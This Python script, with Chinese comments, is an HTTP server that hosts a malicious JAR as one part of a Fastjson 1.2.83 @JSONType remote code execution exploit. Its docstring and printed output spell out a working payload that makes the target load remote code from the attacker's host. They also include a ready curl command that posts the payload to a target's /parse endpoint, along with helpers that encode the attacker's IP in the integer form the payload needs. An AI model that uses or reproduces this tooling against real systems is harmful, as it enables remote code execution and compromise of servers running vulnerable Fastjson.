#!/usr/bin/env python3
"""
Fastjson 1.2.83 @JSONType RCE - 恶意 JAR 文件 HTTP 服务器

用法:
    python3 serve.py [--port PORT] [--dir DIRECTORY]

默认在 0.0.0.0:19090 上监听，提供当前目录下的 probe.jar。

配合 payload:
    {"@type":"jar:http:..<INT_IP>:19090.probe!.GenProbe","x":1}

其中 <INT_IP> 是攻击者 IP 的整数形式。
例如 127.0.0.1 = 2130706433, 192.168.1.100 = 3232235876。
"""

import argparse
import http.server
import logging
import os
import socket
import struct
import sys

def ip_to_int(ip: str) -> int:
    """将点分十进制 IP 转换为整数"""
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def int_to_ip(n: int) -> str:
    """将整数 IP 转换为点分十进制"""
    return socket.inet_ntoa(struct.pack("!I", n))

class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    """带日志的 HTTP 请求处理器"""
    def log_message(self, format, *args):
        client_ip = self.client_address[0]
        logging.info("[%s] %s", client_ip, format % args)

    def do_GET(self):
        logging.info("收到请求: %s", self.path)
        # 记录请求头信息，用于调试
        for k, v in self.headers.items():
            logging.debug("  %s: %s", k, v)
        super().do_GET()

def main():
    parser = argparse.ArgumentParser(description="Fastjson RCE JAR 服务器")
    parser.add_argument("--port", type=int, default=19090,
                       help="监听端口 (默认: 19090)")
    parser.add_argument("--dir", type=str, default=".",
                       help="提供文件的目录 (默认: 当前目录)")
    parser.add_argument("--bind", type=str, default="0.0.0.0",
                       help="绑定地址 (默认: 0.0.0.0)")
    parser.add_argument("--ip", type=str,
                       help="显示本机 IP 的整数形式（不启动服务器）")
    args = parser.parse_args()

    if args.ip:
        n = ip_to_int(args.ip)
        print(f"IP {args.ip} 的整数形式: {n}")
        print(f"验证: {int_to_ip(n)}")
        return

    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    os.chdir(args.dir)
    server = http.server.HTTPServer(
        (args.bind, args.port),
        LoggingHandler,
    )

    # 显示本机 IP 的整数形式
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    int_ip = ip_to_int(local_ip)

    print(f"[*] 服务器启动: http://{args.bind}:{args.port}")
    print(f"[*] 提供目录: {os.path.abspath(args.dir)}")
    print(f"[*] 本机 IP: {local_ip} -> 整数形式: {int_ip}")
    print(f"[*] 127.0.0.1 -> 整数形式: 2130706433")
    print(f"[*] 按 Ctrl+C 停止")
    print()
    print(f"    Payload 示例:")
    print(f"      curl -X POST -H 'Content-Type: application/json' \\")
    print(f"        --data '{{\"@type\":\"jar:http:..{int_ip}:{args.port}.probe!.GenProbe\",\"x\":1}}' \\")
    print(f"        http://target:18080/parse")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.server_close()

if __name__ == "__main__":
    main()